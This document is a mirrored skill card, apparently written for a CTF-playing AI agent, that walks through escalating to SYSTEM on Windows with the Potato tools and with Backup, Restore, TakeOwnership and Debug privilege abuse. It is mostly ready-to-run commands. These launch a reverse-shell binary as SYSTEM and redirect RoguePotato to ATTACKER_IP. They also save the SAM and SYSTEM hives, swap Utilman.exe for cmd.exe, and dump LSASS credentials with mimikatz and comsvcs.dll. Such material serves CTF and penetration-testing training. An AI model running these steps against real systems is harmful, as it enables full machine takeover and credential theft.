# Token Impersonation & Privilege Abuse (Potato family)

[Оглавление](https://raw.githubusercontent.com/BigBread57/zametki/main/INDEX.md) · [Происхождение и ограничения](https://raw.githubusercontent.com/BigBread57/zametki/main/SOURCES.md)

> Справочный документ. Инструкции и примеры ниже принадлежат источнику; они не подтверждают состояние вашей системы и не запускаются автоматически. Чтение этого файла не устанавливает скил, инструменты или MCP.

Источники этого текста:

- [Salman0x01/ctf-ai-agent-skills / instructions/host-windows/token-impersonation-potato.md](https://github.com/Salman0x01/ctf-ai-agent-skills/blob/0e91c90a7125c6591a56f51276275905f2dfb017/instructions/host-windows/token-impersonation-potato.md)

---

---
name: token-impersonation-potato
category: host-windows
triggers: ["SeImpersonatePrivilege", "SeAssignPrimaryTokenPrivilege", "JuicyPotato", "PrintSpoofer", "GodPotato", "RoguePotato", "SweetPotato", "SeBackupPrivilege", "SeRestorePrivilege", "SeTakeOwnershipPrivilege", "SeDebugPrivilege", "potato"]
tools: ["PrintSpoofer.exe", "GodPotato.exe", "JuicyPotato.exe", "RoguePotato.exe", "SweetPotato.exe", "mimikatz", "reg", "robocopy", "whoami"]
priority: high
description: Escalate to SYSTEM by abusing held Windows privileges - the Potato family for SeImpersonate/SeAssignPrimaryToken, plus SeBackup/SeRestore/SeTakeOwnership/SeDebug abuse.
---
# Token Impersonation & Privilege Abuse (Potato family)

## Trigger context
`whoami /priv` shows a powerful privilege held (even if "Disabled"). Service accounts (`iis apppool\*`, `NT AUTHORITY\NETWORK SERVICE`, `LOCAL SERVICE`, MSSQL, `mssql$*`) almost always hold `SeImpersonatePrivilege`. This is one of the most reliable Windows privesc paths.

## Objective
Convert a held privilege into SYSTEM code execution: impersonate a SYSTEM token (Potato) or directly read/write privileged objects (SeBackup/SeRestore/SeTakeOwnership/SeDebug).

## Methodology (decision tree)
1. Read `whoami /priv`. Match the privilege:
   - `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` -> Potato family (below).
   - `SeBackupPrivilege` -> read any file (dump SAM/SYSTEM). See branch B.
   - `SeRestorePrivilege` -> write any file / registry key (overwrite a SYSTEM binary or DLL, or utilman/sethc). Branch C.
   - `SeTakeOwnershipPrivilege` -> take ownership of a file, re-ACL it, replace it. Branch D.
   - `SeDebugPrivilege` -> open SYSTEM processes; migrate/dump LSASS. Branch E.
2. Potato selection by OS build (the key decision):
   - Windows 10 <= 1809 / Server 2016 / Server 2019 (pre-patch, DCOM OXID resolver reachable): JuicyPotato works. Fastest, self-contained.
   - Windows 10 1809+ / Server 2019+ (JuicyPotato killed): use PrintSpoofer (Spooler running) or RoguePotato (needs outbound OXID redirect via a redirector on 135).
   - Windows Server 2012-2022 / Windows 8-11, any patch level, .NET present: GodPotato - broadest modern coverage, DCOM/RPCSS based.
   - SweetPotato / JuicyPotatoNG bundle several methods; good "try everything" fallback.
3. Fire the chosen tool with a payload that grants persistence or a shell.
4. Verify SYSTEM.

## Commands & payloads
Confirm the privilege:
```cmd
whoami /priv | findstr /i "Impersonate AssignPrimary Backup Restore TakeOwnership Debug"
```
PrintSpoofer (SeImpersonate; Win10/Server 2016-2019, Spooler service up):
```cmd
PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -c "C:\Windows\Temp\rev.exe"
```
GodPotato (SeImpersonate; Win8-11 / Server 2012-2022; needs .NET 3.5 or 4.x - pick matching build):
```cmd
GodPotato-NET4.exe -cmd "cmd /c whoami"
GodPotato-NET4.exe -cmd "C:\Windows\Temp\rev.exe"
```
JuicyPotato (SeImpersonate/SeAssignPrimaryToken; <= Server 2016/Win10 1809 - needs a working CLSID for the OS):
```cmd
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c C:\Temp\rev.exe" -t * -c {CLSID}
```
RoguePotato (SeImpersonate; Win10 1809+/Server 2019 - requires an OXID resolver redirect to your host on 135):
```cmd
REM on attacker: socat tcp-listen:135,reuseaddr,fork tcp:VICTIM:9999
RoguePotato.exe -r ATTACKER_IP -e "C:\Windows\Temp\rev.exe" -l 9999
```
SweetPotato (try-all fallback):
```cmd
SweetPotato.exe -a "whoami" -e EfsRpc
```

Branch B - SeBackupPrivilege (read protected files, dump hashes):
```cmd
REM copy locked SAM/SYSTEM using the backup semantic
reg save HKLM\SAM  C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
REM or diskshadow + robocopy /b to grab ntds.dit on a DC
robocopy /b C:\path dst file    REM /b uses backup privilege
```
Then offline: `secretsdump.py -sam SAM -system SYSTEM LOCAL`.

Branch C - SeRestorePrivilege (write any file/registry): overwrite a binary that SYSTEM runs, or an Image File Execution Options debugger / a hijackable DLL; or set an IFEO debugger on a lolbin. Enable the privilege then write.

Branch D - SeTakeOwnershipPrivilege (own then replace a SYSTEM file):
```cmd
takeown /f C:\Windows\System32\Utilman.exe
icacls C:\Windows\System32\Utilman.exe /grant %USERNAME%:F
copy /y cmd.exe C:\Windows\System32\Utilman.exe   REM then trigger Utilman at logon screen
```
Branch E - SeDebugPrivilege (touch SYSTEM processes):
```cmd
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
REM or dump lsass:  rundll32 C:\windows\system32\comsvcs.dll, MiniDump <lsass_pid> C:\Temp\lsass.dmp full
```

## Branching logic
- SeImpersonate + modern build (>=1809) + Spooler up -> PrintSpoofer first; if Spooler disabled -> GodPotato; if outbound 135 redirect possible -> RoguePotato.
- SeImpersonate + old build (<=2016/1809) -> JuicyPotato (map OS to a valid CLSID list).
- Only SeAssignPrimaryToken (no SeImpersonate) -> JuicyPotato/RoguePotato still work; PrintSpoofer needs SeImpersonate.
- SeBackup/SeRestore -> credential dump path, then `credential-hunting` for offline cracking.
- Nothing here works -> back to `windows-enum-winpeas`.

## Common pitfalls
- Wrong GodPotato .NET build vs installed framework -> use `NET2`/`NET3.5`/`NET4` matching the host.
- JuicyPotato fails on patched builds (post 1809) - do not waste time; switch tool.
- RoguePotato needs the OXID resolver on port 135 reachable back to you; blocked egress breaks it.
- PrintSpoofer needs the Print Spooler service running (`sc query spooler`).
- Privileges shown "Disabled" still work for these tools; but SeBackup/SeRestore/SeTakeOwnership must be explicitly enabled in your process token before use (tools/`ntutil` do this).
- Architecture mismatch (x86 tool in x64 world) can silently fail.

## Proof / verification
- `whoami` from the spawned process returns `nt authority\system`.
- Dropped artifact owned by SYSTEM (`icacls file`), or new admin group membership (`net localgroup administrators`).
- Dumped SAM/SYSTEM parse cleanly with secretsdump -> continue in `credential-hunting`.

## Cross-references
- [sa--instructions--host-windows--windows-enum-winpeas.md](https://raw.githubusercontent.com/BigBread57/zametki/main/04-windows/sa--instructions--host-windows--windows-enum-winpeas.md)
- [sa--instructions--host-windows--credential-hunting.md](https://raw.githubusercontent.com/BigBread57/zametki/main/04-windows/sa--instructions--host-windows--credential-hunting.md) (post-SeBackup/SeDebug hash dumping)
- [sa--instructions--host-windows--service-misconfigurations.md](https://raw.githubusercontent.com/BigBread57/zametki/main/04-windows/sa--instructions--host-windows--service-misconfigurations.md)

## Credible sources
- itm4n - PrintSpoofer / "Printer Bug" writeup: https://itm4n.github.io/printspoofer-abusing-impersonation-privileges/
- PrintSpoofer: https://github.com/itm4n/PrintSpoofer
- GodPotato: https://github.com/BeichenDream/GodPotato
- RoguePotato: https://github.com/antonioCoco/RoguePotato
- JuicyPotato: https://github.com/ohpe/juicy-potato
- HackTricks - Roguepotato, PrintSpoofer, SharpEfsPotato, GodPotato: https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer.html
- HackTricks - SeImpersonate / Abusing Tokens: https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html
